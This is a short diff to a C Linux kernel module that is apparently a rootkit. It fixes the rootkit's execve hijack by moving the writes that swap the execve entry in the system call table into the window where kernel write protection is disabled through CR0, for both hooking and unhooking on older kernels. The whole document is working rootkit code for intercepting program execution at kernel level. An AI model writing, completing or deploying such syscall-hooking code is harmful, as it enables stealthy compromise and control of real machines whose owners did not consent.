@@ -210,6 +210,7 @@ rk_hijack_execve(void)
 	if (syscall_table != NULL) {
 		write_cr0 (read_cr0 () & (~ 0x10000));
 		real_execve = (void *)syscall_table[__NR_execve];
+		syscall_table[__NR_execve] = &new_execve;
 		write_cr0 (read_cr0 () | 0x10000);
 #ifdef DEBUG
 		pr_info("%s: execve is at %p\n", RK_NAME, real_execve);
@@ -226,7 +227,6 @@ rk_hijack_execve(void)
 	clear_bit(16, &cr0);
 	rk_write_cr0(cr0);
 #endif
-	syscall_table[__NR_execve] = &new_execve;
 }
 
 void
@@ -235,6 +235,7 @@ rk_unhijack_execve(void)
 #if LINUX_VERSION_CODE < KERNEL_VERSION(5,3,0)
 	if (syscall_table != NULL) {
 		write_cr0 (read_cr0 () & (~ 0x10000));
+		syscall_table[__NR_execve] = real_execve;
 		write_cr0 (read_cr0 () | 0x10000);
 #ifdef DEBUG
 		printk(KERN_EMERG "%s: sys_call_table unhooked\n", RK_NAME);
@@ -250,7 +251,6 @@ rk_unhijack_execve(void)
 	set_bit(16, &cr0);
 	rk_write_cr0(cr0);
 #endif
-	syscall_table[__NR_execve] = real_execve;
 }
 
 static int __init
